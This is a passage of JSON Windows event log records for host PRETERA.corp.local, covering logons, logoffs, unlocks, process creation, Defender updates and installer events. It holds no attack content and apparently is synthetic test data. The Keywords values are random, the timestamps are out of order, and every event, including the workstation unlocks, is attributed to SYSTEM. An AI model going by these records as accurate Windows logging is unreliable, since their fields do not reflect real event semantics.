    "ExecutionProcessID": 8434,
    "ExecutionThreadID": 1056,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4624,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "Successful logon.",
    "EventTime": "2025-03-27T06:31:15.012775Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "117583752214589920",
    "RecordNumber": 11126,
    "ExecutionProcessID": 6274,
    "ExecutionThreadID": 9727,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-26T20:22:01.012781Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "67334265204237046",
    "RecordNumber": 429581,
    "ExecutionProcessID": 9195,
    "ExecutionThreadID": 5921,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4688,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "A new process has been created.",
    "EventTime": "2025-03-27T06:35:57.012787Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "940112091357378371",
    "RecordNumber": 968215,
    "ExecutionProcessID": 8001,
    "ExecutionThreadID": 2016,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 6,
    "SourceName": "Microsoft-Windows-FilterManager",
    "Channel": "System",
    "Message": "File System Filter successfully loaded.",
    "EventTime": "2025-03-27T02:28:53.012795Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "929142380462110611",
    "RecordNumber": 628264,
    "ExecutionProcessID": 7692,
    "ExecutionThreadID": 4386,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-27T03:56:49.012801Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "173026090811940356",
    "RecordNumber": 436064,
    "ExecutionProcessID": 9795,
    "ExecutionThreadID": 6986,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4634,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "An account was logged off.",
    "EventTime": "2025-03-26T16:27:27.012807Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "788445114100088191",
    "RecordNumber": 237520,
    "ExecutionProcessID": 3149,
    "ExecutionThreadID": 9092,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-26T11:05:57.012813Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "728910022832460614",
    "RecordNumber": 30936,
    "ExecutionProcessID": 1853,
    "ExecutionThreadID": 2935,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 6,
    "SourceName": "Microsoft-Windows-FilterManager",
    "Channel": "System",
    "Message": "File System Filter successfully loaded.",
    "EventTime": "2025-03-27T03:56:59.012822Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "930567571070204217",
    "RecordNumber": 405732,
    "ExecutionProcessID": 6030,
    "ExecutionThreadID": 8197,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4634,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "An account was logged off.",
    "EventTime": "2025-03-27T08:36:27.012828Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "984652141772697260",
    "RecordNumber": 828855,
    "ExecutionProcessID": 9072,
    "ExecutionThreadID": 1259,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4634,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "An account was logged off.",
    "EventTime": "2025-03-26T22:17:54.012834Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "219225138551399295",
    "RecordNumber": 554514,
    "ExecutionProcessID": 2113,
    "ExecutionThreadID": 6969,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4634,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "An account was logged off.",
    "EventTime": "2025-03-27T05:12:16.012842Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "860120595560643608",
    "RecordNumber": 853989,
    "ExecutionProcessID": 6043,
    "ExecutionThreadID": 1717,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4688,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "A new process has been created.",
    "EventTime": "2025-03-26T23:40:59.012848Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "245877117002187995",
    "RecordNumber": 810133,
    "ExecutionProcessID": 2481,
    "ExecutionThreadID": 6904,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-27T02:39:42.012854Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "643832225738854559",
    "RecordNumber": 304934,
    "ExecutionProcessID": 3486,
    "ExecutionThreadID": 6026,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4688,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "A new process has been created.",
    "EventTime": "2025-03-26T17:09:56.012863Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "884957830985536831",
    "RecordNumber": 27485,
    "ExecutionProcessID": 2677,
    "ExecutionThreadID": 4683,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-26T19:54:55.012869Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "483713864086163009",
    "RecordNumber": 748315,
    "ExecutionProcessID": 7182,
    "ExecutionThreadID": 6879,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 6,
    "SourceName": "Microsoft-Windows-FilterManager",
    "Channel": "System",
    "Message": "File System Filter successfully loaded.",
    "EventTime": "2025-03-27T05:27:36.012875Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "85243364823010032",
    "RecordNumber": 739504,
    "ExecutionProcessID": 1140,
    "ExecutionThreadID": 8644,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4634,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "An account was logged off.",
    "EventTime": "2025-03-26T09:46:21.012881Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "844256223042080351",
    "RecordNumber": 948260,
    "ExecutionProcessID": 3936,
    "ExecutionThreadID": 6566,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-27T07:50:47.012887Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "276977013052594268",
    "RecordNumber": 880152,
    "ExecutionProcessID": 4535,
    "ExecutionThreadID": 1752,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 1040,
    "SourceName": "MsiInstaller",
    "Channel": "Application",
    "Message": "Windows Installer started a transaction.",
    "EventTime": "2025-03-26T11:28:35.012893Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "90716290115793109",
    "RecordNumber": 815020,
    "ExecutionProcessID": 6924,
    "ExecutionThreadID": 8881,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-26T15:08:09.012899Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "434399987329643965",
    "RecordNumber": 939450,
    "ExecutionProcessID": 2473,
    "ExecutionThreadID": 4176,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 1040,
    "SourceName": "MsiInstaller",
    "Channel": "Application",
    "Message": "Windows Installer started a transaction.",
    "EventTime": "2025-03-27T00:30:38.012905Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "836912918500973392",
    "RecordNumber": 143214,
    "ExecutionProcessID": 3547,
    "ExecutionThreadID": 1420,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4688,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "A new process has been created.",
    "EventTime": "2025-03-26T14:25:53.012911Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "691478825210937807",
    "RecordNumber": 911447,
    "ExecutionProcessID": 9469,
    "ExecutionThreadID": 1498,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4688,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "A new process has been created.",
    "EventTime": "2025-03-26T10:50:16.012917Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "643772251338900693",
    "RecordNumber": 762732,
    "ExecutionProcessID": 7505,
    "ExecutionThreadID": 1676,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-26T22:57:18.012928Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "8258101687767462",
    "RecordNumber": 720124,
    "ExecutionProcessID": 5680,
    "ExecutionThreadID": 6585,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-26T11:24:01.012934Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "468873349616286555",
    "RecordNumber": 315389,
    "ExecutionProcessID": 1804,
    "ExecutionThreadID": 8763,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4624,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "Successful logon.",
    "EventTime": "2025-03-26T23:25:55.012940Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "444086609761877645",
    "RecordNumber": 968099,
    "ExecutionProcessID": 7550,
    "ExecutionThreadID": 9063,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 1040,
    "SourceName": "MsiInstaller",
    "Channel": "Application",
    "Message": "Windows Installer started a transaction.",
    "EventTime": "2025-03-27T08:48:05.012946Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "689945174593089346",
    "RecordNumber": 463571,
    "ExecutionProcessID": 2899,
    "ExecutionThreadID": 3295,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 1040,
    "SourceName": "MsiInstaller",
    "Channel": "Application",
    "Message": "Windows Installer started a transaction.",
    "EventTime": "2025-03-26T13:25:15.012953Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "827295329114045498",
    "RecordNumber": 857549,
    "ExecutionProcessID": 3652,
    "ExecutionThreadID": 9276,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-27T05:05:10.012959Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "279206888341498369",
    "RecordNumber": 982779,
    "ExecutionProcessID": 6411,
    "ExecutionThreadID": 2574,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-27T04:30:23.012968Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "87606900266783440",
    "RecordNumber": 478872,
    "ExecutionProcessID": 7910,
    "ExecutionThreadID": 1688,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 6,
    "SourceName": "Microsoft-Windows-FilterManager",
    "Channel": "System",
    "Message": "File System Filter successfully loaded.",
    "EventTime": "2025-03-26T21:17:46.012974Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "159754080413945781",
    "RecordNumber": 871962,
    "ExecutionProcessID": 6842,
    "ExecutionThreadID": 8385,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4688,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "A new process has been created.",
    "EventTime": "2025-03-26T23:49:32.012980Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "34236649975816229",
    "RecordNumber": 333840,
    "ExecutionProcessID": 7068,
    "ExecutionThreadID": 9780,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-26T19:13:06.012986Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "51315049401693350",
    "RecordNumber": 283695,
    "ExecutionProcessID": 6043,
    "ExecutionThreadID": 9027,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-26T14:54:44.012994Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "422148454335461177",
    "RecordNumber": 769829,
    "ExecutionProcessID": 6198,
    "ExecutionThreadID": 6059,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4624,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "Successful logon.",
    "EventTime": "2025-03-27T01:11:09.013000Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "483267999740135490",
    "RecordNumber": 638183,
    "ExecutionProcessID": 5397,
    "ExecutionThreadID": 5451,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4634,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "An account was logged off.",
    "EventTime": "2025-03-26T22:16:25.013006Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "495349275711423275",
    "RecordNumber": 412403,
    "ExecutionProcessID": 6550,
    "ExecutionThreadID": 8033,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-27T08:35:54.013012Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "601809981269696349",
    "RecordNumber": 477568,
    "ExecutionProcessID": 2890,
    "ExecutionThreadID": 3398,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-27T08:45:45.013018Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "24900327150761954",
    "RecordNumber": 794039,
    "ExecutionProcessID": 7897,
    "ExecutionThreadID": 4399,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} 